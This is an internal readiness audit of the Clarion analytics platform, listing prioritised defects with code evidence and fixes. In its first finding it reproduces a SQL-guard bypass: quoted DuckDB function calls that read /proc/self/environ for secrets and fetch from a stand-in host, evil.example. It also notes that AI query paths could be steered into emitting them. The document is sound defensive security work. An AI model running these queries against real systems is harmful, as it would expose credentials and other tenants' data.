# Market readiness assessment, second pass — what is still missing after waves 1 and 2

> **Status:** assessment, doc only. No product code changed.
> **Date:** 2026-09-05 · verified against `main` at `9ab13a2` (PR #118 merged).
> **Predecessor:** [`market-readiness-assessment.md`](./market-readiness-assessment.md)
> (2026-09-01) — its six P0 and seven P1 findings were remediated in waves 1 and
> 2; wave 3 was stopped by owner decision on 2026-09-02. This document does not
> repeat that one. It re-runs the question against the code as it is now.
> **Companion artifact:** "Clarion Launch Preflight II".

Owner's question, again: *"I want to bring Clarion to the market. What is still
missing? What do I miss for multiple customers? Is the platform complete in all
functional and non-functional aspects?"* — this time with the instruction to
first decide which domains matter, then investigate each thoroughly.

Method: twelve domain investigations run in parallel against the working tree,
each reading code, migrations, workflows and Terraform rather than CLAUDE.md or
the previous assessment. Every finding below carries `file:line` evidence. The
highest-severity claims were re-verified by hand before being written down, and
one claim from an investigator was rejected on that check (recorded in §8).
Where production state cannot be known from the repository, the one-line check
that would settle it is given instead of a guess.

---

## Verdict

**Still no-go for a paying customer, but for different reasons than four days
ago.** Waves 1 and 2 did what they set out to do: the isolation, health,
alerting, suspension, rate-limiting and operator-console findings are closed in
code and verified here. What remains falls into four groups, and the middle two
were not visible until the platform was looked at from the customer's chair
rather than the operator's:

0. **One security control has a hole in it.** The SQL guard that keeps every
   query away from DuckDB's file functions can be bypassed by double-quoting
   the function name — reproduced in this session (§3, P0-1). It is a
   half-day fix and it goes first.
1. **The product does not tell the truth in places where it says it does.** A
   partially failed sync is a green badge. A data policy that masks a column in
   Ask AI does not mask it on the dashboard the same answer was pinned to. And —
   the finding this pass exists for — **every boot-time schedule loader reads a
   tenant-scoped table on the root pool with no tenant context, which under the
   production role returns zero rows: no scheduled sync, transformation, report
   email or pipeline can have fired since the 2026-08-06 role flip** unless a
   leaked pool connection happened to carry a tenant. That is verifiable with
   one production log line (§8).
2. **Second users cannot arrive.** "Send invite" sends no email in production
   and creates an unverified user who cannot log in. The first customer's ten
   colleagues are unreachable.
3. **The paperwork and the operator acts owed from wave 2 are still owed**:
   legal documents in draft with no acceptance, DR infrastructure written but
   never applied, no restore ever rehearsed, no record of what a customer
   bought.

| Severity | Count | Meaning |
|---|---|---|
| **P0** | 9 | Blocks the first paying customer, or breaks a promise already made to them |
| **P1** | 74 (3 owner-deferred) | Breaks between customer two and twenty, or makes support a database session |
| **P2** | ≈50 | Polish, cost and market fit — worth knowing, not worth blocking on |

None of this is a rewrite. Most P0 items are one to three days each. The
largest single item is the sync-truthfulness work (§3, P0-6), and the largest
non-engineering item is the legal go-live, which needs a lawyer and cannot be
shortened by code.

---

## 1. The reference model — twelve domains

The first assessment used seven planes. Seven was enough to find what was
missing *around* the product; it was not enough to find what was wrong *inside*
it once the platform work landed, because "data platform correctness", "AI
governance" and "performance headroom" each hid inside a broader plane. Twelve
domains, each with a one-line definition of "ready" for a first paying customer
and the honest status found this pass:

| # | Domain | Ready means | Status now |
|---|---|---|---|
| 1 | Tenant isolation & data security | Every store separates tenants at the data layer; every user/AI SQL path is guarded; proven by tests under the production role | **Mostly closed** — one fail-open pattern remains in worker-reachable code; six execution paths unguarded |
| 2 | Identity, auth & account lifecycle | Verified signup, strong sessions, invites that arrive, org policy, immediate offboarding, auditable | **Partial** — invites do not arrive; profile edit is dead; no auth events audited |
| 3 | Commercial & entitlements | A record of what was bought and by which legal entity; every cost driver metered or capped | **Absent** (AI metering excepted, which is complete) |
| 4 | Legal, privacy & GDPR | Enforceable ToS + DPA accepted before processing; accurate subprocessor list; export + erasure that match the DPA | **Draft** — nothing in force, nothing accepted, export missing |
| 5 | Reliability, DR & infrastructure | Recovery points that exist, restores that were rehearsed, migrations that cannot strand the live revision | **Written, not applied** |
| 6 | Observability, support & incidents | A support path, an incident channel, one correlation id across API and jobs, per-tenant errors readable without a DB session | **Partial** — console exists; errors, jobs and comms do not reach it |
| 7 | Data platform correctness | The numbers are right and stay current; failures are visible; a table can be rebuilt | **Weak** — partial failures read as success; no re-sync; deletions never propagate; scheduled work not loading under RLS |
| 8 | AI governance, safety & cost | One entry point, budgeted, guarded, policy-applied on every path, measurable quality | **Partial** — budget and guard strong; policies and eval missing |
| 9 | Product & UX readiness | A Belgian SMB admin reaches a first answer unaided; colleagues can use it daily | **Partial** — first-run works for the admin; colleagues cannot join; no error pages; English only (deferred) |
| 10 | Quality engineering | What matters is gated; the core loop and the production role are exercised in CI | **Partial** — the gate is real; the core loop and RLS-under-app-role are not in it |
| 11 | Performance & multi-tenant headroom | Known capacity per replica; no request pins shared resources for minutes; caches bounded | **Fine at 5, fails at 20** — no scale rules, per-request transaction pinned across SSE, unbounded caches |
| 12 | Application security hardening | Hardened HTTP surface, validated input, no injection, no SSRF, secrets never default | **Strong, with one hole** — HTTP, egress, shell and injection posture are good; the SQL guard bypass (P0-1), an HTML-injection sink and unvalidated report recipients remain |

---

## 2. What wave 1 and wave 2 closed — verified on main, not assumed

Each item below was re-read in code this pass. Nothing in this table is taken
from the previous document or from CLAUDE.md.

| Finding | Verified where |
|---|---|
| `auth_lookup` policy in a migration; CI logs in as `databridge_app` | `migrations/20260901000088`, `test.yml:128-246` (backend started as `databridge_app` at `:211`) |
| Graph tenant-scoped by construction | `backend/scripts/lint-graph-tenant-predicate.ts` → exit 0, 80 clauses; `getProductTree(tenantId)` required at `db/semanticGraph.ts:2655` |
| RLS on every table added since | grids, grid rows, saved questions, api tokens, dashboard user views — all ENABLE + FORCE + policy (migrations 81, 83, 86, 87); `ALTER DEFAULT PRIVILEGES` at migration 75:48-56 |
| Email verification, default AI budget, slug retry | `services/signup.ts:47-52, 127`; `routes/auth.ts:266-273` |
| Deep health gating promotion | `services/healthCheck.ts:140-145`; `deploy.yml:595-618` |
| Alerts as GitOps | `.ops/alerts` (9 rules), `alerts.yml:132-203` |
| Tenant status re-validated every 30 s; refresh checks tenant | `middleware/auth.ts:150-156`; `refreshTokenService.ts:143-156` |
| Operator console with suspend, budget, audited impersonation | `routes/adminTenants.ts:60-361` |
| Redis-backed limiters keyed by tenant and account | `middleware/rateLimitStore.ts`; `index.ts:196-263` |
| Liveness reapers, per-tenant fairness | `services/reapers.ts:42-43`; `jobs/tenantFairness.ts` |
| Tenant on every metric and worker failure; 24 h per-tenant stats | `requestLogger.ts:94-104`; `jobs/workers.ts:374-564`; `services/tenantRequestStats.ts` |
| AI budget on all six SDK entry points, no bypass | `AIService.ts:347, 654, 724, 1498, 1824, 1889` |
| Frontend type-check and tests in the deploy gate | `test.yml` `frontend-checks`; `deploy.yml:86` gate waits for the whole Tests workflow |
| Neo4j backup, share soft-delete, RTO/RPO written | `infra/main.tf:216-262, 173-177`; `docs/runbooks/disaster-recovery.md` — **written, not applied** (§3, P0-9) |

---

## 3. P0 — blocks the first paying customer

### P0-1 · One pair of double quotes walks past the SQL guard

`utils/sqlGuard.ts` is the control that stands between every user- or
AI-authored query and DuckDB's file and network functions. `stripLiterals()`
(`:80-88`) erases **double-quoted identifiers** along with string literals
before `EXTERNAL_FN_RE` (`:180-184`) scans for `read_text`, `read_parquet`,
`read_csv`, `glob` and the rest — so a function name written as an identifier
is invisible to the denylist, and DuckDB parses a quoted function name exactly
as it parses a bare one. Reproduced against the real module in this session:

```
refused : SELECT * FROM read_text('/proc/self/environ')
ALLOWED : SELECT * FROM "read_text"('/proc/self/environ')
ALLOWED : SELECT * FROM "read_parquet"('https://evil.example/x.parquet')
refused : SELECT * FROM "read_parquet"('az://other-tenant/x.parquet')   ← the az:// net still fires
```

The second net (`URI_SCHEME_RE`, `:73`) deliberately excludes `http(s)` and
local paths, so only the object-storage case is caught. Both compensating
controls are off: `DUCKDB_SESSION_LOCKDOWN` is opt-in and set nowhere
(`services/warehouse/duckdb.ts:70`), and DuckDB's `enable_external_access` is
left at its default. The query executes in the child runner, whose
environment is the parent's (`queryRunnerPool.ts` `runnerEnv()` overrides
memory and threads only), so `/proc/self/environ` yields
`AZURE_STORAGE_CONNECTION_STRING` (account-wide — every tenant's warehouse),
`JWT_SECRET`, `CREDENTIALS_ENCRYPTION_KEY` and `ANTHROPIC_API_KEY`.

Reachable from any analyst login: `POST /api/notebooks/query`
(`routes/notebooks.ts:139`), `/api/notebooks/cells/:id/execute` (`:789`),
dashboard widget execution (`routes/dashboards.ts:2387, 2629`), `/api/query`,
and the Excel add-in (`routes/addin.ts:89`). A viewer reaches it through any
AI path that can be steered to emit it. Nothing logs or alerts on a guard
refusal today (`UnsafeSqlError` is caught only in `sqlSelfHeal.ts:167`), so a
probing tenant leaves no trace either way.

*Not executed against a live DuckDB in this sandbox (no native binding); the
guard bypass itself is reproduced, and DuckDB's identifier grammar is what
makes the quoted form a function call.*

**Remediation (½ day, do it first):** scan the raw SQL for
`["']?<fn>["']?\s*\(` before stripping anything, and treat any double-quoted
identifier that names a denylisted function as a refusal; add the reproduced
cases to `tests/sqlGuard.test.ts`; turn `DUCKDB_SESSION_LOCKDOWN=1` on in
`.ops`/`main.tf` after verifying `az://` reads on a 0% revision; log every
`UnsafeSqlError` with tenant and user at WARN and add it to `.ops/alerts`.

### P0-2 · Scheduled work cannot load under the production role

**Every boot-time schedule loader reads a tenant-scoped, RLS-forced table on
the root pool with no tenant context.**

```
jobs/scheduler.ts:105                semanticDb('transformation_schedules').where({ enabled: true })
jobs/emailScheduler.ts:66            semanticDb('email_schedules').where({ enabled: true })
jobs/connectionSyncScheduler.ts:95   semanticDb('connection_sync_schedules').where({ enabled: true })
jobs/pipelineScheduler.ts:110        semanticDb('pipelines').where({ enabled: true })
```

All four tables carry `tenant_isolation` whose predicate is
`tenant_id = NULLIF(current_setting('app.current_tenant', true), '')::integer`
(`migrations/20260403000021:47-48`, `…000044`, `…000045`, `…000037:32-36`).
With no tenant set the predicate is `tenant_id = NULL`, never true, so each
loader receives **zero rows** and registers zero repeatable jobs. They run from
`index.ts:436-440` at boot and again from `jobs/scheduleReconciler.ts:42-45` on
every Redis reconnect. The morning brief is the counter-example that proves
the mechanism: it enumerates `tenants` (a table with no RLS) and then wraps
every read in `tenantQuery(tenantId, …)` (`morningBriefService.ts:53-99`), so
briefs work; schedules do not.

`sendScheduledReport` has the same shape one layer down:
`reportEmailService.ts:139` reads `email_schedules` by id on the root pool and
returns silently on zero rows, so even a job that somehow got registered
would deliver nothing.

**Why this was not caught.** Production has connected as `databridge_app`
(NOBYPASSRLS) since 2026-08-06, verified by the owner's `prod-checks` run on
2026-09-01. Every backend vitest suite connects as the superuser (`test.yml:34,
63`), where RLS is inert, and the one CI job that runs as `databridge_app`
(`rls-isolation`) exercises HTTP routes, never the boot loaders. There is no
test in `backend/src/tests` or `e2e/` that references any `load*Schedules`
function.

**Failure scenario, as the customer sees it:** they set a nightly sync and a
Monday report email. Nothing fires. The source card says "synced 9 days ago",
the report never arrives, and no alert exists for "schedule that should have
fired and did not" (the `clarion-failed-syncs` rule watches for failures, not
absences).

**One caveat, stated so it can be checked rather than argued:** the request
path still issues a session-level `SET app.current_tenant` on the pool
(`middleware/auth.ts:167`, kept "during the migration period"). A pooled
connection that served a request *before* a loader ran could carry that
tenant's id, in which case the loader would register that one tenant's
schedules and nobody else's. Either way the behaviour is wrong; which way it
is wrong is a production question.

**The production check (one line):** the boot log emits
`Loaded N enabled connection-sync schedule(s)` (`connectionSyncScheduler.ts:99`)
and `[email-scheduler] loaded schedules` with a `count`. Compare `N` with
`SELECT count(*) FROM connection_sync_schedules WHERE enabled` as the admin
role. `N = 0` with rows present confirms it.

**Remediation (½ day + ½ day of test):** loaders enumerate `tenants` and read
each tenant's rows under `tenantQuery`, exactly as `morningBriefService` does;
`sendScheduledReport` takes `tenantId` in job data and reads under it; a CI
job (extend `rls-isolation`) boots the backend as `databridge_app` with one
enabled schedule of each kind and asserts the four log lines report `1`.

### P0-3 · Invites are never delivered — the customer's colleagues cannot join

`routes/users.ts:52-125` creates the user, mints a temporary password and a
7-day reset token, builds `inviteUrl` (`:108`), logs it only under
`NODE_ENV === 'development'` (`:109-111`) and returns it in the response only
when `NODE_ENV !== 'production'` (`:123`). **There is no `sendEmail` call in
the file**; repo-wide there are four `sendEmail` call sites (verification,
password reset, two report paths) and invite is not one of them. The frontend
renders the URL block conditionally (`app/users/page.tsx:320-325`), so in
production the admin clicks "Send invite", the button says "Sending…", and
nothing further happens.

Compounding it: the insert never sets `email_verified_at` (`:93-104`), so with
verification enforced (production has ACS) the invitee is refused at login
(`routes/auth.ts:266`) even if they somehow obtained the link. The
reset-redeems-as-verified rule from the first assessment's P0-5  would rescue
them — if the link arrived.

**Remediation (½ day):** send the invite through `emailService`, mark the
invite verified-on-redeem explicitly, and add the send to the
`signup-hardening` test file as a red-first test.

### P0-4 · Data policies are enforced on Ask AI and nowhere else

`applyDataPolicies` (row filters and column masks) is called from exactly two
route files: `routes/query.ts` (six sites) and `routes/addin.ts:99`, plus
`services/sqlSelfHeal.ts`. It is **absent** from `routes/dashboards.ts`
(widget execution at `:1891, :2387, :2629`), `routes/notebooks.ts`,
`routes/savedQuestions.ts`, `routes/reports.ts`, `services/reportEmailService.ts`,
`services/investigateService.ts` and `services/pulseService.ts`.

The scenario the DPA advertises (`frontend/lib/legal/dpa.ts:124-126` lists
data policies as an Annex II measure): an admin masks `bank_account` for the
Sales role. The analyst asks in Ask AI and sees `***`. They pin the answer to a
dashboard; on reload the identical SQL runs through `dashboards.ts:2387` with
no policy, shows the IBAN, and the same rows are serialised into the insights
prompt (`ai/prompts/insightsPrompt.ts:17-19, 47-48`) and sent to Anthropic.

**Remediation (1 day):** route every user/AI SQL execution through one helper
that applies policies then guards then executes — the shape `sqlSelfHeal`
already has — and pin each of the seven paths with a masked-column test.

### P0-5 · Session-level tenant context on the shared pool, in code the worker runs

`jobs/workers.ts:9-26` documents why a session-level `SET app.current_tenant`
on the shared pool is forbidden ("fail-OPEN … reads and writes someone else's
rows") and every job handler there uses `tenantQuery`. The services those
handlers call do not:

```
orchestrator/SyncOrchestrator.ts:73     set_config('app.current_tenant', ?, false)   ← is_local=false
services/pipelineService.ts:97,196,450  SET app.current_tenant = '…'
services/busMatrixOrchestrator.ts:232,540
services/warehouse/deltaWriter.ts:263
services/auditService.ts:128
jobs/pipelineScheduler.ts:139
```

`runPipelineWorkflow` and `runProductRefreshWorkflow` are invoked directly
from the bus-matrix worker (`workers.ts:230-254`) at concurrency 2. Tenant A's
pipeline sets its id on pooled connection X; tenant B's job sets its own on Y;
A's next `semanticDb` query is handed Y and writes `pipeline_runs` /
`transformation_runs` under B's tenant. RLS is satisfied — it filters to the
wrong tenant. Not detectable by any current test (superuser).

**Remediation (1 day):** the same `tenantQuery` conversion the workers already
had, applied to the eleven sites; then delete the request-path fallback SET at
`middleware/auth.ts:167` and let the ratchet that already exists for shared
transactions grow a rule for session-level SET.

### P0-6 · The sync does not tell the truth about itself

Four defects, one theme: what the customer sees as "synced" is not what
happened.

- **A partially failed sync is reported as success.**
  `packages/connectors/src/exactonline/ExactOnlineConnector.ts:379-387`
  catches per-entity errors into `warnings`, sets `rowCounts[entity] = 0`, and
  the worker exits `EXIT_OK`; the orchestrator writes `status: 'succeeded'`
  (`SyncOrchestrator.ts:474-487, 557-567`). Green badge, "synced 5 minutes
  ago", and `SalesInvoiceLines` holds last week's rows.
- **A transient empty response wipes a table.** For an entity without a
  `mergeKey`, or one whose `$top=1` discovery returns nothing
  (`ExactOnlineConnector.ts:411-431`), `ParquetWriter.ts:103-118` takes the
  overwrite branch and replaces the table with a zero-row Parquet. The run is
  still `succeeded`.
- **There is no full re-sync, backfill or cursor reset.** `entity_sync_cursors`
  is only ever read and upserted (`SyncOrchestrator.ts:335, 514, 530`);
  `triggerSync` has no `full` flag (`routes/connections.ts:313`). The only way
  to rebuild a wrong table is to delete and recreate the connection.
- **Deletions never propagate.** Incremental merge keeps rows absent from the
  delta by design (`ParquetWriter.ts:96-99`). A draft invoice deleted in
  Exact Online stays in the warehouse forever, and every fact built from that
  table stays inflated with no signal.

**Remediation (3–4 days):** a run with any failed entity is `partial`, shown as
such, and alertable; empty-result overwrite requires an explicit flag or a
previous-count sanity check; a `full` re-sync per connection and per entity,
exposed on the source card; a periodic key-list reconciliation per incremental
entity (fetch ids only, delete what the source no longer has) — Exact Online's
`$select=ID` makes that cheap.

### P0-7 · The contract does not exist yet

`frontend/app/legal/LegalPage.tsx:18` — `LEGAL_IN_FORCE = false`. Twelve
placeholders remain across the four documents (`[COMPANY LEGAL NAME]`,
`[KBO/BCE NUMBER]`, `[REGISTERED ADDRESS]`, `[PRIVACY CONTACT EMAIL]`) plus
two `TO BE VERIFIED BY COUNSEL` holes for the Anthropic transfer mechanism
(`privacy.ts:60-63`, `dpa.ts:86-88`, `subprocessors.ts:44-46`). Grep for
`terms_accepted|accepted_at|acceptTerms` across backend and frontend: **zero
hits** — no column, no checkbox, no versioned acceptance. And the DPA promises
"in-product user erasure, **data export** and full workspace deletion"
(`dpa.ts:64-66`); erasure and deletion exist (`services/accountDeletion.ts`,
which discovers every `tenant_id` table dynamically at `:120-124` — the best
piece in this domain); export does not, anywhere.

This is the first assessment's P0-4 finding in its closing state: the drafting half is
done and good, the lawyer half is owed. It stays P0 because Article 28
requires the contract *before* processing, and connecting Exact Online is
processing.

**Remediation:** lawyer review (external, ~1 week); then the go-live steps in
`docs/legal/README.md`; plus two engineering days: a `terms_acceptances` table
with version + timestamp + user, a required checkbox on register and on first
login after a version bump, and a tenant data-export job (JSON per table +
the warehouse container as a SAS download) so the DPA sentence becomes true.

### P0-8 · Nothing records what a customer bought, and every non-AI cost is uncapped

The owner deferred billing to manual invoices (2026-09-01). Manual invoicing
still needs two things the platform does not have:

- **A customer record.** `tenants` is `id, name, slug, status, created_at,
  updated_at` plus `auto_approve`, `monthly_token_budget`, `ai_routing_mode`.
  No plan, seat count, contract dates, invoice contact, legal name, address or
  VAT number — a repo-wide grep for `plan_|subscription|entitlement|seat|
  vat_number|billing|contract_` returns zero commercial hits. A Belgian B2B
  invoice requires the legal name, address and BTW number; today that lives
  in the founder's inbox, unlinked to a tenant id.
- **A cap on what is not AI.** `monthly_token_budget` is enforced on every AI
  path with no bypass (verified). Nothing else is bounded: users, connections,
  synced tables, products, dashboards, grids, notebooks, saved questions, API
  tokens, email schedules, pipelines, and sync frequency — the cron is
  validated for syntax only, with no minimum interval
  (`routes/connectionSyncSchedules.ts:41-46, 119-121`). A "5 seats, 3 sources"
  customer can add 40 users and 20 connections on `* * * * *`, and the operator
  finds out on the Azure bill. `tenants.status` is binary
  (`adminTenants.ts:230`): no trial end, no grace, no read-only.

**Remediation (2 days):** `tenants` gains `plan`, `seats`, `max_connections`,
`trial_ends_at`, `billing_contact`, `legal_name`, `vat_number`, `address`;
creation routes for users/connections/schedules refuse over the limit with a
sentence; a minimum sync interval (15 min); a monthly CSV of `ai_usage` +
counts per tenant from `/admin/tenants`. Cost stays in USD until an FX
decision is made — record the rate used on each invoice.

### P0-9 · Recovery exists on paper only

- `infra/main.tf:36-42` — the `backend "azurerm"` block is commented out;
  `infra-preflight.yml:103` reports no state storage account; no workflow
  contains `terraform plan|apply`. The Recovery Services vault, the Neo4j
  file-share backup policy and the share soft-delete written in wave 2
  **do not exist in Azure** — `docs/runbooks/disaster-recovery.md:9-16` says so
  itself. The live jobs-worker was created with `az`, outside state, so the
  first apply is itself a hazard.
- No restore has been rehearsed: `disaster-recovery.md:141-160` is an
  all-unchecked list, while `:22-35` quotes an RTO/RPO offer.
- Migrations run against production with no backup and no rollback path:
  `deploy.yml:288-307` runs `migrate:latest` before any revision exists;
  `rollback.yml` shifts traffic only; the additive-only rule is a comment
  (`deploy.yml:23-25`), and twelve migrations in the tree call `dropColumn`.

**Remediation (owner acts, ~1 day of engineering to enable them):** create the
state storage account and uncomment the backend; `terraform import` the
existing resources; apply; then the §6 rehearsal in the DR runbook. Add a
`pg_dump` (or a point-in-time marker) step before `migrate-sql` in deploy.yml,
and a CI job that runs `migrate:latest` then `migrate:rollback` on a fresh DB.

---

## 4. P1 — breaks between the second and the twentieth customer

Grouped by domain. Each row is a real defect with evidence; the fix column is
sized for one engineer.

### Domain 1 — isolation & data security

| ID | Finding | Evidence | Fix |
|---|---|---|---|
| 1-1 | Six user/AI SQL execution paths reach DuckDB with no `sqlGuard`: forecast (`query.ts:2548, 2558`), KPI formulas (`reports.ts:44`), scheduled dashboard widgets (`reportEmailService.ts:219`), scheduled saved questions (`:317`, guarded only at save time), morning-brief KPIs (`morningBriefService.ts:199`). The DuckDB session holds the **account-wide** storage secret (`services/warehouse/duckdb.ts:194-208`), so per-tenant containers are no barrier at the read layer | 22 execution sites counted, 6 unguarded | ½ day — one execute helper (shared with P0-4) |
| 1-2 | `DUCKDB_SESSION_LOCKDOWN` is off by default (`duckdb.ts:70`) and set in neither `infra/main.tf` nor `.ops`; the documented defence against `read_text('/proc/self/environ')` is inactive, leaving `sqlGuard` — which P0-1 shows is bypassable — as the sole layer | | flip on a 0% revision, verify `az://` reads, then default on |
| 1-3 | The role-flip preflight prints "RLS not enabled / not forced" without blocking (`scripts/preflight-role-flip.ts:246-252`); no standing test asserts "every `tenant_id` table has FORCE + policy" — migrations 56 and 74 were one-shot sweeps | | ½ day — one vitest reading `pg_tables`/`pg_policy` |
| 1-4 | `ai_model_config` has ENABLE but not FORCE (`migrations/…000065:27`) | only remaining table in that state | migration |
| 1-5 | Cross-tenant e2e covers 4 resources (`e2e/rls.spec.ts:94-204`); none of the 5 tables added since 2026-08-20 | | ½ day |
| 1-6 | No key rotation: `utils/crypto.ts:20-24` derives one key, envelope carries no key id; `JWT_SECRET` has no `kid` (`middleware/auth.ts:70-85`); rotating either breaks every credential or every session. Log redaction is a 7-path allowlist (`utils/logger.ts:35-46`) — a connector config logged under another key is not censored | | 1 day — versioned envelope + re-encrypt script |

### Domain 2 — identity & account lifecycle

| ID | Finding | Evidence | Fix |
|---|---|---|---|
| 2-1 | **`PATCH /users/profile` is still dead** — registered at `routes/users.ts:462`, after `PATCH /:id` at `:131`; Express matches `/profile` as `:id` → 403 for analyst/viewer, 500 for admin (`Number('profile')` → NaN at `:149`). `app/profile/page.tsx:54` calls it. Nobody can change their display name. Known since PR #114 (closed unmerged); still on main | | 10 minutes — move the literal routes above `/:id` |
| 2-2 | A 15-minute impersonation session can mint a 180-day API token: `routes/apiTokens.ts:41-74` requires only `requireAuth`; the `impersonatedBy` claim is written (`auth.ts:93-100`) and **read nowhere**. The "self-closing window" guarantee from P1-5 does not hold | | ½ day — refuse token creation, password change, MFA change and purge under `impersonatedBy`; render a banner |
| 2-3 | Same email in two tenants breaks login: `users` is unique on `(tenant_id, email)`, but `/login` (`auth.ts:232-236`), `/forgot-password` (`:491`) and `/resend-verification` (`:682`) do a global `.first()` with no `ORDER BY`; invite checks only inside the tenant (`users.ts:79`). Tenant B invites alice@acme.com who already works at tenant A → nondeterministic login | | 1 day — either global-unique email or a tenant picker at login |
| 2-4 | No auth events in `audit_events`: login success/failure, logout, register, forgot, reset completion, verification, refresh issue/revoke are all missing (32 verbs exist; `index.ts:194` claims `login.fail` is tracked — no such write exists) | | 1 day |
| 2-5 | No refresh-token rotation or reuse detection (`auth.ts:408` "no rotation in v1"); tokens live in `localStorage` (`frontend/lib/storage.ts:16-19`); no CSP on the frontend (`next.config.mjs` defines no headers). One stored XSS = 30 days of silent access | | 2 days — rotate-on-refresh with family revocation; `headers()` in next.config |
| 2-6 | No org-level MFA policy; operators are not required to have MFA; `PLATFORM_OPERATOR_EMAILS` (`config.ts:113-118`) is the only control on cross-tenant read, suspend and impersonation | | 1 day — `require_mfa` on tenants; hard-require for operator emails |
| 2-7 | No SSO / Microsoft 365 login — a sales blocker in this market and the reason MFA cannot be enforced centrally | none | 3–5 days (Entra OIDC) — owner-deferred territory |
| 2-8 | `routes/dashboards.ts` has zero `requireRole` across 26 mutating routes — viewers can AI-generate dashboards and spend the tenant's budget | | ½ day — decide and gate |

### Domain 4 — legal & privacy

| ID | Finding | Evidence | Fix |
|---|---|---|---|
| 4-1 | No breach/incident runbook; the DPA promises notification "without undue delay" (`dpa.ts:99-104`) and `/security` promises an incident runbook (`app/security/page.tsx:110`) | `docs/runbooks/` has 4 files, none for incidents | 1 day of writing |
| 4-2 | The privacy draft says "functional storage only, no cross-site tracking" (`privacy.ts:88-91`) while every page hotlinks Google Fonts (`app/globals.css:1`, `StoryModal.tsx:108`) and notebooks pull Pyodide from jsdelivr (`usePyodide.ts:49`); neither is in the subprocessor list | 3 external hosts contacted by the browser | ½ day — self-host fonts and Pyodide, or disclose |
| 4-3 | No per-tenant AI opt-out (`services/ai/tenantAiMode.ts:26-48` has `claude/hybrid/azure`, no `off`); the "not used for training" claim rests on Anthropic's standard terms with no zero-retention configuration | | 1 day |
| 4-4 | `audit_events` has no retention rule (absent from `retention.ts:34-39`), no export, and writes are best-effort and swallowed (`auditService.ts:75-79`) | | ½ day |

### Domain 5 — reliability & infrastructure

| ID | Finding | Evidence | Fix |
|---|---|---|---|
| 5-1 | A total outage while idle raises no alarm: backend, frontend, Neo4j and ETL all `min_replicas = 0`; every alert is traffic- or log-derived; the uptime test is documented as "create it in the portal" and there is no evidence it was | `variables.tf:158-161`, `.ops/alerts` | 3 minutes in the portal (owner) — or an `az monitor app-insights web-test` step in `alerts.yml` |
| 5-2 | One email address, no paging, sev-1 and sev-2 on the same channel; `clarion-failed-syncs` fires on any single line every 15 min (`alerts.tf:179-197`) — one flaky source floods the inbox the outage mail lands in | | ½ day — SMS/webhook receiver on sev-1; threshold on failed-syncs |
| 5-3 | Postgres connection arithmetic is over budget: pool 10 per process (`knex.ts:48`) × 3 backend replicas + worker + migration ≈ 40 against `B_Standard_B1ms` max_connections 35; `acquireTimeoutMillis: 30000` turns that into 30 s hangs | | set `KNEX_POOL_MAX` per role, or raise the SKU |
| 5-4 | No scale rule anywhere (`main.tf:699-706, 1026-1033`); ACA's implicit HTTP rule ≈ 10 concurrent per replica → ~30 in-flight platform-wide; worker throughput fixed at concurrency 2 forever | | 1 day — HTTP rule on backend, Redis queue-length KEDA rule on worker |
| 5-5 | Redis: 0.25 vCPU / 0.5 GiB, single replica, `noeviction` with **no `maxmemory`** (`main.tf:425-441`); job retention age-only → the kernel OOM-kills it, taking every queue; and the rate limiter fails open on Redis error (`rateLimitStore.ts:71-74`), so brute-force protection is off during exactly that outage | | `maxmemory` + count-capped retention; fail-closed for the brute limiters only |
| 5-6 | No staging environment — "staging" is a 0% revision on the production database; migrations meet production-shaped data for the first time in production; CI migrates an empty DB | | accept, or a weekly PITR-restore-to-staging job (which doubles as the DR rehearsal) |
| 5-7 | jobs-worker is a singleton (`min = max = 1`) and work is not resumable; sync jobs have `replica_retry_limit = 0` (`main.tf:1219-1221`) — an ACA node recycle mid-sync is a failed run needing a manual re-trigger | | ties to P0-6 |
| 5-8 | Frontend and ETL promote with no health check (`deploy.yml:622-626, 463-470`); three different concurrency groups across deploy/promote/rollback (`deploy.yml:60`, `promote.yml:39`, rollback none) | | ½ day |

### Domain 6 — observability & support

| ID | Finding | Evidence | Fix |
|---|---|---|---|
| 6-1 | No correlation id crosses API → BullMQ → worker: `requestId` appears nowhere in `jobs/`, `services/` or `worker/`; "my sync failed at 14:02" means guessing which of N jobs was theirs | | ½ day — put `requestId` in job data, bind in the worker child logger |
| 6-2 | The operator sees counts, never errors: `adminTenants.ts:200-204` returns sync run status but not `error_message` (the column exists); no recent-errors endpoint; `prod-logs.yml:126` filters by container only — **no tenant filter exists in any log tooling** | | 1 day |
| 6-3 | No support channel: zero `mailto:`, help link, feedback form or docs link anywhere in the chrome; `HelpTooltip` is used in one file | | ½ day for the channel; docs are a separate effort |
| 6-4 | No incident communication: no maintenance-mode flag, status page, system banner or announcement table. Redis is down for 40 minutes and there is no way to tell five tenants | | 1 day — an `announcements` row read by the shell, operator-written |
| 6-5 | No operator user-administration: reset-MFA, role change, deactivate, invite are all tenant-admin-only (`users.ts:131-372`); `adminTenants.ts` exposes no user mutations; every support task needs impersonation | | 1 day |
| 6-6 | No queue visibility or cancel: `routes/jobs.ts` is tenant-scoped with retry only for `failed` (`:82`); an active stuck job cannot be cancelled from any UI; no dead-letter queue and **no retry policy on any queue** (`queues.ts:113-175` sets no `defaultJobOptions`) — one transient Redis/Postgres blip is a permanent failure | | 1 day |
| 6-7 | Runbooks: 4 files, 2 Dutch-only; missing Redis down, Neo4j down, stuck sync, purge, key rotation, restore drill, scaling, incident comms, security incident | | writing, ongoing |
| 6-8 | No operator cost view: `cost_usd` exists in `ai_call_log` but `/admin/ai-usage` is tenant-scoped; `/admin/tenants` shows tokens, never dollars; no storage or compute per tenant; no export | | ties to P0-8 |

### Domain 7 — data platform (beyond P0-6)

| ID | Finding | Evidence | Fix |
|---|---|---|---|
| 7-1 | A dead source is never announced: `notifyAdmins` fires for schema drift and first-sync only (`SyncOrchestrator.ts:880, 994`); failure branches only log (`:611, 631`); no "hasn't synced in N hours" rule. A rotated-away Exact Online refresh token bricks every future sync silently | | ½ day — notify on failure; a freshness rule per tenant |
| 7-2 | Quality gates are advisory: `runTransformationChecks` is try/caught and warn-logged (`transformationRunner.ts:686-690`); a fan-out failure still publishes (`:819-823`) | | decide: block on `fail`, or label the table |
| 7-3 | Stale rollups outlive their fact on the Delta path: the runner `continue`s before the rollup block (`:773` vs `:843-853`), `rollup_path` is never refreshed or cleared, and `productContext.ts:294-306` still tells the model to prefer the rollup — a frozen aggregate answers "revenue by month" | | ½ day |
| 7-4 | Concurrent-writer data loss on the blob merge (read-modify-write, no lease/ETag, `BlobSasWarehouseWriter.ts:118-151`) combined with startup recovery marking `running` syncs failed while the ACA job keeps running (`index.ts:497-505`) | | 1 day — blob lease |
